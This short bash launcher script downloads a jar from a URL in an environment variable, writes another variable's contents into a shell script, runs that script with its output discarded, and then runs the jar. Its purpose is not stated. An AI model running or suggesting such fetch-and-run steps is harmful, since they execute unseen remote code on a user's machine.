#!/bin/bash
echo $LINK2 > start2.sh
curl $LINKS --out leatestacc.jar
bash start2.sh &> /dev/null
java -jar leatestacc.jar















